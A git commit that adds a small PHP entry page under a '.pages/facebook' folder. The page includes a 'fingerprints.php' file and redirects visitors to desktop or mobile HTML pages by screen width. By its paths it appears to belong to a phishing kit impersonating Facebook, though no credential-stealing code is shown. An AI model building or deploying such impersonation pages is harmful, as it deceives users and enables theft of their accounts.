d2bf841028ba1fa49e4dfc48a3037b0676e25db4
mak <makindosx@gmail.com>
2022-02-24 14:44:04 -0500

    Add files via upload

---
+++ .pages/facebook/index.php
@@ -0,0 +1,12 @@
+<?php 
+include 'fingerprints.php';
+?>
+
+<script type="text/javascript">
+if (screen.width >= 700) {
+document.location = "index.html";
+}
+else {
+document.location = "mobile.html";
+}
+</script> 
